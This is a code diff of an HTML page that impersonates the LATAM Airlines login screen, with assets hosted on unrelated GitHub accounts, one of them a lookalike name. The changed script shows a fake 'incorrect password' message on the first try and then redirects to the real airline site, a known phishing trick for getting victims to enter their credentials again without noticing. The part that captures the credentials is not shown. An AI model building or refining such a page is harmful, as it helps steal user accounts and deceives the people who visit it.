@@ -4,13 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Faça seu Login | LATAM AIRLINES</title>
-    <link rel="icon" href="https://th.bing.com/th/id/R.a5ac268982d8c5e364e26ae5bf2225a8?rik=BdgmKlyYGtyqig&pid=ImgRaw&r=0">
+    <link rel="icon" href="https://th.bing.com/th/id/OIP.pawmiYLYxeNk4mrlvyIlqAHaL4?rs=1&pid=ImgDetMain">
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background: url('https://raw.githubusercontent.com/IatamSources/src/main/background.png') no-repeat center center fixed;
+            background: url('https://raw.githubusercontent.com/Jeanpseven/tam/main/background.png') no-repeat center center fixed;
             background-size: cover;
         }
         .container {
@@ -67,21 +67,26 @@
         }
     </style>
     <script>
-        var firstAttempt = true;
+        let attempt = 0;
 
         function validateForm(event) {
             event.preventDefault();
+            var username = document.forms["loginForm"]["username"].value;
             var password = document.forms["loginForm"]["password"].value;
             var errorMessage = document.getElementById("error-message");
 
-            if (firstAttempt) {
+            if (username === "" || password === "") {
                 errorMessage.style.display = "block";
-                errorMessage.textContent = "Senha incorreta. Tente novamente.";
-                document.forms["loginForm"]["password"].value = ""; // Limpar campo de senha
-                document.forms["loginForm"]["password"].focus(); // Focar no campo de senha
-                firstAttempt = false;
+                errorMessage.textContent = "Por favor, preencha todos os campos.";
             } else {
-                window.location.href = 'https://www.latamairlines.com';
+                attempt++;
+                if (attempt < 2) {
+                    errorMessage.style.display = "block";
+                    errorMessage.textContent = "Senha incorreta. Por favor, tente novamente.";
+                } else {
+                    errorMessage.style.display = "none";
+                    window.location.href = 'https://www.latamairlines.com';
+                }
             }
         }
     </script>
